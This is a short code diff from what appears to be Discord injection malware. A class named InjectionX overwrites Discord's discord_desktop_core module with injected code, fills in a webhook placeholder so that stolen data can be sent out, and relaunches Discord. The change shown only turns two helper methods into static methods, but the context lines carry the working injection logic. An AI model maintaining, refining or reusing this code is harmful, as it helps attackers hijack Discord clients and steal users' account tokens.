@@ -30,7 +30,8 @@ class InjectionX:
                     f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                     self.start_discord(dir)
 
-    def get_core(self, dir: str) -> tuple:
+    @staticmethod
+    def get_core(dir: str) -> tuple:
         for file in os.listdir(dir):
             if re.search(r'app-+?', file):
                 modules = dir + '\\' + file + '\\modules'
@@ -43,7 +44,8 @@ class InjectionX:
                             continue
                         return core, file
 
-    def start_discord(self, dir: str) -> None:
+    @staticmethod
+    def start_discord(dir: str) -> None:
         update = dir + '\\Update.exe'
         executable = dir.split('\\')[-1] + '.exe'
 
